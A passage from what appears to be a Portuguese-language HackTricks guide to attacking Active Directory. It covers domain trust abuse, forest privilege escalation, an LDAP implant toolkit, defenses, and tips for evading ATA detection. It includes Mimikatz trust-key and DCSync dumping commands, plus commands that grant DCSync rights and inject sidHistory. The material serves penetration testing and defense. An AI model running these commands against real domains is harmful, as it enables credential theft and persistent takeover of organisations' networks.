Registra um **novo Domain Controller** no AD e o usa para **pushar atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar logs sobre as **modificações**. Você **precisa de DA** privilégios e estar dentro do **root domain**.\
Note que, se você usar dados errados, logs bem feios podem aparecer.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Anteriormente discutimos como escalar privilégios se você tiver **permissão suficiente para ler senhas do LAPS**. Entretanto, essas senhas também podem ser usadas para **manter persistência**.\
Confira:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

A Microsoft vê a **Forest** como o limite de segurança. Isso implica que **comprometer um único domínio pode potencialmente levar ao comprometimento de toda a Forest**.

### Basic Information

Um [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) é um mecanismo de segurança que permite que um usuário de um **domínio** acesse recursos em outro **domínio**. Essencialmente cria uma ligação entre os sistemas de autenticação dos dois domínios, permitindo que as verificações de autenticação fluam de forma transparente. Quando domínios configuram uma trust, eles trocam e mantêm chaves específicas dentro de seus **Domain Controllers (DCs)**, que são cruciais para a integridade da trust.

Em um cenário típico, se um usuário pretende acessar um serviço em um **domínio confiável**, ele deve primeiro solicitar um ticket especial conhecido como **inter-realm TGT** ao DC do seu próprio domínio. Esse TGT é criptografado com uma **chave de trust** que ambos os domínios concordaram em compartilhar. O usuário então apresenta esse TGT ao **DC do domínio confiável** para obter um ticket de serviço (**TGS**). Após a validação bem-sucedida do inter-realm TGT pelo DC do domínio confiável, ele emite um TGS, concedendo ao usuário acesso ao serviço.

**Passos**:

1. Um **computador cliente** em **Domain 1** inicia o processo usando seu **NTLM hash** para solicitar um **Ticket Granting Ticket (TGT)** do seu **Domain Controller (DC1)**.
2. DC1 emite um novo TGT se o cliente for autenticado com sucesso.
3. O cliente então solicita um **inter-realm TGT** do DC1, necessário para acessar recursos em **Domain 2**.
4. O inter-realm TGT é criptografado com uma **trust key** compartilhada entre DC1 e DC2 como parte da trust bidirecional.
5. O cliente leva o inter-realm TGT ao **Domain Controller (DC2)** do Domain 2.
6. DC2 verifica o inter-realm TGT usando sua trust key compartilhada e, se válido, emite um **Ticket Granting Service (TGS)** para o servidor no Domain 2 que o cliente quer acessar.
7. Finalmente, o cliente apresenta esse TGS ao servidor, que é criptografado com o hash da conta do servidor, para obter acesso ao serviço em Domain 2.

### Different trusts

É importante notar que **uma trust pode ser unidirecional ou bidirecional**. Na opção de 2 vias, ambos os domínios confiarão um no outro, mas na relação de **1 way** um dos domínios será o **trusted** e o outro o **trusting**. No último caso, **você só poderá acessar recursos dentro do trusting domain a partir do trusted**.

Se Domain A confia em Domain B, A é o trusting domain e B é o trusted. Além disso, em **Domain A**, isso seria uma **Outbound trust**; e em **Domain B**, isso seria uma **Inbound trust**.

**Diferentes relações de trust**

- **Parent-Child Trusts**: Configuração comum dentro da mesma forest, onde um child domain automaticamente possui uma trust transitiva bidirecional com seu parent domain. Essencialmente, isso significa que pedidos de autenticação podem fluir sem problemas entre o parent e o child.
- **Cross-link Trusts**: Chamadas de "shortcut trusts", são estabelecidas entre child domains para acelerar processos de referral. Em florestas complexas, os referrals de autenticação normalmente têm que subir até o root da forest e depois descer até o domínio alvo. Criando cross-links, a jornada é encurtada, o que é especialmente útil em ambientes geograficamente dispersos.
- **External Trusts**: Configuradas entre domínios diferentes e não relacionados, e são não-transitivas por natureza. Segundo a [documentação da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts são úteis para acessar recursos em um domínio fora da forest atual que não está conectado por uma forest trust. A segurança é reforçada pelo SID filtering com external trusts.
- **Tree-root Trusts**: Essas trusts são estabelecidas automaticamente entre o forest root domain e uma nova tree root adicionada. Embora não sejam comuns, tree-root trusts são importantes para adicionar novas trees de domínio a uma forest, permitindo que mantenham um nome de domínio único e garantindo transitividade bidirecional. Mais informações estão no [guia da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Tipo de trust transitiva bidirecional entre dois forest root domains, também aplicando SID filtering para aumentar medidas de segurança.
- **MIT Trusts**: Estabelecidas com domínios Kerberos não-Windows compatíveis com [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts são um pouco mais especializadas e atendem ambientes que requerem integração com sistemas baseados em Kerberos fora do ecossistema Windows.

#### Other differences in **trusting relationships**

- Uma relação de trust também pode ser **transitiva** (A confia em B, B confia em C, então A confia em C) ou **não-transitiva**.
- Uma relação de trust pode ser configurada como **bidirectional trust** (ambos confiam um no outro) ou como **one-way trust** (apenas um confia no outro).

### Attack Path

1. **Enumerar** as relações de trusting
2. Verificar se algum **security principal** (user/group/computer) tem **acesso** a recursos do **outro domínio**, talvez por entradas ACE ou por estar em grupos do outro domínio. Procure por **relações entre domínios** (a trust foi criada provavelmente para isso).
1. kerberoast nesse caso poderia ser outra opção.
3. **Comprometer** as **contas** que podem **pivotar** entre domínios.

Atacantes podem acessar recursos em outro domínio através de três mecanismos principais:

- **Local Group Membership**: Principals podem ser adicionados a grupos locais em máquinas, como o grupo “Administrators” em um servidor, concedendo-lhes controle significativo sobre essa máquina.
- **Foreign Domain Group Membership**: Principals também podem ser membros de grupos dentro do domínio estrangeiro. Entretanto, a eficácia desse método depende da natureza da trust e do escopo do grupo.
- **Access Control Lists (ACLs)**: Principals podem estar especificados em uma **ACL**, particularmente como entidades em **ACEs** dentro de uma **DACL**, provendo acesso a recursos específicos. Para quem quer se aprofundar na mecânica de ACLs, DACLs e ACEs, o whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” é um recurso inestimável.

### Find external users/groups with permissions

Você pode checar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar foreign security principals no domínio. Estes serão usuários/grupos de **um domínio/forest externo**.

Você pode verificar isso no **Bloodhound** ou usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Outras formas de enumerar relações de confiança entre domínios:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Existem **2 chaves confiáveis**, uma para _Child --> Parent_ e outra para _Parent_ --> _Child_.\
> Você pode ver qual é usada pelo domínio atual com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escale para Enterprise admin no domínio child/parent abusando do trust com SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Entender como o Configuration Naming Context (NC) pode ser explorado é crucial. O Configuration NC funciona como um repositório central para dados de configuração em toda a floresta em ambientes Active Directory (AD). Esses dados são replicados para cada Domain Controller (DC) dentro da floresta, com DCs graváveis mantendo uma cópia gravável do Configuration NC. Para explorar isso, é necessário ter **privilégios SYSTEM em um DC**, preferencialmente um child DC.

**Link GPO to root DC site**

O container Sites do Configuration NC inclui informação sobre os sites de todos os computadores associados ao domínio dentro da floresta AD. Operando com privilégios SYSTEM em qualquer DC, atacantes podem linkar GPOs aos sites do root DC. Essa ação potencialmente compromete o domínio root ao manipular políticas aplicadas a esses sites.

Para informação aprofundada, pode-se explorar a pesquisa sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Um vetor de ataque envolve o direcionamento a gMSAs privilegiados dentro do domínio. A KDS Root key, essencial para calcular as senhas dos gMSAs, é armazenada dentro do Configuration NC. Com privilégios SYSTEM em qualquer DC, é possível acessar a KDS Root key e calcular as senhas de qualquer gMSA em toda a floresta.

Análises detalhadas e orientações passo a passo podem ser encontradas em:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementar a delegated MSA (BadSuccessor – abusando atributos de migração):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Pesquisa externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Este método requer paciência, aguardando a criação de novos objetos AD privilegiados. Com privilégios SYSTEM, um atacante pode modificar o AD Schema para conceder a qualquer usuário controle total sobre todas as classes. Isso pode levar a acesso e controle não autorizados sobre objetos AD recém-criados.

Leitura adicional disponível em [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

A vulnerabilidade ADCS ESC5 tem como alvo o controle sobre objetos de Public Key Infrastructure (PKI) para criar um template de certificado que permite autenticar-se como qualquer usuário dentro da floresta. Como objetos de PKI residem no Configuration NC, comprometer um DC child gravável possibilita a execução de ataques ESC5.

Mais detalhes podem ser lidos em [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Em cenários sem ADCS, o atacante tem a capacidade de configurar os componentes necessários, como discutido em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Neste cenário, um domínio externo confia no seu domínio, concedendo-lhe permissões indeterminadas sobre ele. Você precisará descobrir **quais principals do seu domínio têm quais acessos sobre o domínio externo** e então tentar explorá-los:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domínio de Floresta Externa - Unidirecional (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Neste cenário **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

No entanto, quando um **domínio é confiado** pelo domínio que confia, o domínio confiado **cria um usuário** com um **nome previsível** que usa como **senha a senha confiada**. O que significa que é possível **acessar um usuário do domínio que confia para entrar no domínio confiado** para enumerá-lo e tentar escalar mais privilégios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Outra forma de comprometer o domínio confiado é encontrar um [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** da confiança de domínio (o que não é muito comum).

Outra forma de comprometer o domínio confiado é aguardar em uma máquina na qual um **usuário do domínio confiado possa acessar** para fazer login via **RDP**. Então, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir daí.\
Além disso, se a **vítima montou seu disco rígido**, a partir do processo da **sessão RDP** o atacante poderia armazenar **backdoors** na **pasta de inicialização do disco rígido**. Essa técnica é chamada **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação do abuso de confiança de domínio

### **SID Filtering:**

- O risco de ataques que exploram o atributo SID history em trusts entre florestas é mitigado pelo SID Filtering, que é ativado por padrão em todas as trusts inter-florestas. Isso se baseia na suposição de que os trusts intra-floresta são seguros, considerando a floresta, em vez do domínio, como a fronteira de segurança segundo a posição da Microsoft.
- No entanto, há um problema: o SID Filtering pode interromper aplicações e o acesso de usuários, levando à sua desativação ocasional.

### **Selective Authentication:**

- Para trusts inter-florestas, empregar a Selective Authentication garante que usuários das duas florestas não sejam autenticados automaticamente. Em vez disso, permissões explícitas são exigidas para que usuários acessem domínios e servidores dentro do domínio ou floresta que confia.
- É importante notar que essas medidas não protegem contra a exploração do Configuration Naming Context (NC) gravável ou ataques à conta de trust.

[**Mais informações sobre confiança de domínio em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolvem nomes curtos/caminhos de OU em DNs completos e despejam os objetos correspondentes.
- `get-object`, `get-attribute`, and `get-domaininfo` extraem atributos arbitrários (including security descriptors) além dos metadados de floresta/domínio de `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expõem candidatos a roasting, configurações de delegation, e descriptors existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) diretamente do LDAP.
- `get-acl` and `get-writable --detailed` analisam a DACL para listar trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), e herança, fornecendo alvos imediatos para elevação de privilégios via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitivas de escrita LDAP para escalada e persistência

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) permitem que o operador prepare novos principals ou contas de máquina onde quer que existam direitos sobre a OU. `add-groupmember`, `set-password`, `add-attribute`, e `set-attribute` sequestram diretamente alvos assim que direitos de write-property são encontrados.
- Comandos focados em ACL como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, e `add-dcsync` traduzem WriteDACL/WriteOwner em qualquer objeto AD para resets de senha, controle de associação de grupos ou privilégios DCSync sem deixar artefatos PowerShell/ADSI. Contrapartes `remove-*` limpam ACEs injetadas.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` tornam instantaneamente um usuário comprometido Kerberoastable; `add-asreproastable` (UAC toggle) marca-o para AS-REP roasting sem tocar na senha.
- Macros de delegação (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescrevem `msDS-AllowedToDelegateTo`, flags UAC, ou `msDS-AllowedToActOnBehalfOfOtherIdentity` a partir do beacon, habilitando caminhos de ataque constrained/unconstrained/RBCD e eliminando a necessidade de PowerShell remoto ou RSAT.

### Injeção de sidHistory, realocação de OU e modelagem da superfície de ataque

- `add-sidhistory` injeta SIDs privilegiados no SID history de um principal controlado (see [SID-History Injection](sid-history-injection.md)), fornecendo herança de acesso furtiva totalmente via LDAP/LDAPS.
- `move-object` altera o DN/OU de computadores ou usuários, permitindo que um atacante mova ativos para OUs onde direitos delegados já existem antes de abusar de `set-password`, `add-groupmember`, ou `add-spn`.
- Comandos de remoção com escopo estreito (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permitem rollback rápido após o operador coletar credenciais ou estabelecer persistência, minimizando a telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algumas Defesas Gerais

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Medidas Defensivas para Proteção de Credenciais**

- **Domain Admins Restrictions**: Recomenda-se que Domain Admins só sejam permitidos fazer logon em Controladores de Domínio, evitando seu uso em outros hosts.
- **Service Account Privileges**: Serviços não devem ser executados com privilégios Domain Admin (DA) para manter a segurança.
- **Temporal Privilege Limitation**: Para tarefas que requerem privilégios DA, sua duração deve ser limitada. Isso pode ser alcançado por: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementando Técnicas de Decepção**

- Implementar decepção envolve montar armadilhas, como usuários ou computadores decoy, com características como senhas que não expiram ou marcados como Trusted for Delegation. Uma abordagem detalhada inclui criar usuários com direitos específicos ou adicioná-los a grupos de alto privilégio.
- Um exemplo prático envolve usar ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mais sobre deploy de técnicas de decepção pode ser encontrado em [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando Decepção**

- **For User Objects**: Indicadores suspeitos incluem ObjectSID atípico, logons infrequentes, datas de criação e baixo número de tentativas de senha incorreta.
- **General Indicators**: Comparar atributos de potenciais objetos decoy com os de objetos genuínos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem ajudar a identificar tais decepções.

### **Contornando Sistemas de Detecção**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitar a enumeração de sessões em Controladores de Domínio para prevenir detecção pelo ATA.
- **Ticket Impersonation**: Utilizar chaves **aes** para criação de tickets ajuda a evadir detecção ao não rebaixar para NTLM.
- **DCSync Attacks**: Recomenda-se executar a partir de um host que não seja Controlador de Domínio para evitar detecção pelo ATA, pois execução direta a partir de um Controlador de Domínio acionará alertas.

## Referências

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
